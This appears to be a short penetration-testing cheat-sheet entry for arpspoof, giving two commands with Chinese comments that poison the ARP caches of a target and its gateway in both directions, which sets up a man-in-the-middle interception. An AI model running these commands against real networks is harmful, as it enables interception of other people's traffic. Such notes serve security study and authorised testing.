# arpspoof

```bash
# 欺骗网关，伪装成目标机器
arpspoof -i eth0 -t <targetip> <gatewayip>

# 欺骗目标机器，伪装成网关
arpspoof -i eth0 -t <gatewayip> <targetip>
```
